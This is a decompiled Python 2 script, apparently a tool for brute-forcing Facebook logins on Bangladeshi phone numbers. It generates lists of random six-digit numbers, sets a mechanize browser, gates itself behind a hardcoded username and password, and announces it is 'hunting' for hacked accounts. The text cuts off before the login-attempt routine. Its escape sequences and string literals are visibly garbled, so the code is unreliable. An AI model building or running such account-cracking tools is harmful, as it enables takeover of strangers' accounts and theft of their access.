# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-06-09 19:59:17.533837
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
os.system('clear')
logo1 ="""
 
  
 _______ _______  ______ _  _  _ _______
 |  |  | |_____| |_____/ |  |  | |_____|
 |  |  | |     | |    \ |__|__| |     |
                                        

                                          
                                          

"""
                                                           
                                                           
                                                          
print """


  
 _______ _______  ______ _  _  _ _______
 |  |  | |_____| |_____/ |  |  | |_____|
 |  |  | |     | |    \ |__|__| |     |
                                        

                                          
                                          

                                                             """





mrm = raw_input('\1b[1;96m[?] \1b[1;97mEnter Your User Agent \1b[1;96m>>>> ')
for n in range(10000):
    nmbr = random.randint(111111, 999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', mrm + ';]')]

def exb():
    os.sys.exit()


def psb(z):
    for e in z + '\':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


def jalan(z):
    for e in z + '\':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


logo = """

  
 _______ _______  ______ _  _  _ _______
 |  |  | |_____| |_____/ |  |  | |_____|
 |  |  | |     | |    \ |__|__| |     |
                                        

                                          
                                          




  Auther  :  MarWa MalikZada                                Github  :  Marwa Malikzada
  T.me   :     @malikzada0
  Facebook: Selin Seval
  Contact :  For Get Password Contact Me 
  
"""
                                                          
                                                           

"""[1;33;40m--------------------------------------------------\  \1b[1;36;40mAuthor     \1b[1;33;40m: \1b[0;37;40 Marwa Malikzada\  \1b[1;36;40mT.me    \1b[1;33;40m: \1b[@malikzada0\  \1b[1;36;40mFacebook   \1b[1;33;40m: \1b[0;37;40m Selin Seval\  \1b[1;36;40mPublic     \1b[1;33;40m: \1b[0;37;40m12-05-2022\\1b[1;33;40m--------------------------------------------------\  """                            

os.system('clear')
print logo
CorrectUsername = 'selin'
CorrectPassword = 'seval'
loop = 'true'
while loop == 'true':
    username = raw_input('\1b[1;96m[?] \1b[1;97mTool USERNAME \1b[1;96m>>>> ')
    if username == CorrectUsername:
        password = raw_input('\1b[1;96m[?] \1b[1;97mTool PASWORD \1b[1;96m>>>> ')
        if password == CorrectPassword:
            print 'NASA Hacked Successful....'
            loop = 'false'
        else:
            print '\1b[1;91mWrong!,\1b[1;92mText me to get the correct password'
            os.system('xdg-open https://github.com/marwamalikzada')
    else:
        print '\1b[1;91mWrong!,\1b[1;92mText me to get the correct username'
        os.system('xdg-open www.facebook.com/100008560417536')

back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    global cpb
    global oks
    os.system('clear')
    print logo
    print '\1b[1;32;40mEnter Sim Code And + Any \1b[1;31;40m2 \1b[1;32;40mDigit Without Space  \\\1b[0;37;45m Grameenphone : 17**,13** \ Robi         : 18** \ Airtel       : 16** \ Banglalink   : 19**,14** '
    try:
        c = raw_input(' \\\\1b[1;32;40mChoose code \1b[1;31;40m >>>>\1b[1;35;40m ')
        k = '+880'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\[ Back ]')
        menu()

    xxx = str(len(id))
    print 50 * '\1b[1;33;40m-'
    psb('\1b[1;32;40m[-_-] Please wait__')
    psb('[-_-] Total : 99999')
    time.sleep(0.5)
    psb('[-_-] Lets Start Hunting')
    time.sleep(0.5)
    print 50 * '\1b[1;33;40m-'
    psb('\1b[1;32;40mHacked Accouny Will Appear Here Success id are Just now login & Cp id login after3 days')
    print

    def main(arg):
        user = arg
        try:
            os.mkdir('MarWa')
        except OSError:
